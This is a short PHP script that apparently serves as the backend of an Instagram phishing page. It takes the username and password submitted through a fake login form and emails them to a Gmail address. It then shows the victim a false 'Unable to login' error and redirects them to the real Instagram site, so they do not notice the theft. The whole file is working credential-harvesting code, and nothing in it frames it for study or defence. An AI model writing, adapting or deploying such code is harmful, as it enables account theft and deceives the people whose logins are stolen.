<?php
// Variable settings
$username = $_POST['u_name'] ?? '';  // Fetch username (using null coalescing operator)
$passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing operator)

// Email settings
$subject = "Someone Login! Insta Dummy Page";
$to = "humanerror0729@gmail.com";
$txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body

// Check input fields
if (!empty($username) && !empty($passcode)) {
    // Send email
    if (mail($to, $subject, $txt)) {
        echo "<script type='text/javascript'>alert('Error! Unable to login.'); window.location.replace('https://www.instagram.com');</script>";
    } else {
        echo "<script type='text/javascript'>alert('There was an error sending the email.'); window.history.go(-1);</script>";
    }
} else {
    echo "<script type='text/javascript'>alert('Please enter correct username or password. Try again.'); window.history.go(-1);</script>";
}
?>
